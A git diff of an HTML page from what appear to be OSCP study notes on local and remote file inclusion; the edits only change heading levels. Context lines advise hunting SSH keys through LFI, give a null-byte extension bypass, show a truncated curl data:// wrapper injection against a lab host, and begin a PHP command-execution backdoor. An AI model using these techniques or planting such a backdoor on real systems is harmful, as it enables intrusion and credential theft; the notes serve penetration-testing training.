@@ -173,14 +173,15 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="lfi--rfi"><a class="header" href="#lfi--rfi">LFI / RFI</a></h1>
+                        <h2 id="lfi--rfi"><a class="header" href="#lfi--rfi">LFI / RFI</a></h2>
 <p>ON OSCP, if you are able to find LFI anywhere, hunt down the SSH keys first</p>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html">Total OSCP Guide</a></li>
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/">Payloads All The Things</a></li>
 <li><a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">LFI Medium Article</a></li>
 </ul>
-<h2 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion:</a></h2>
+<h3 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion:</a></h3>
 <ol>
 <li>Check if you can convert LFI to RFI</li>
 <li>Try adding %00 to bypass the added extension on the server side. (Works on PHP &lt; 5.3)</li>
@@ -272,7 +273,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 
 </code></pre>
 <p><img src="FileInclusionExample.png" alt="File Inclusion Example" /></p>
-<h1 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h1>
+<h2 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h2>
 <pre><code>//Simple PHP backdoor
 &lt;?php 
 if(isset($_REQUEST['cmd'])){ 
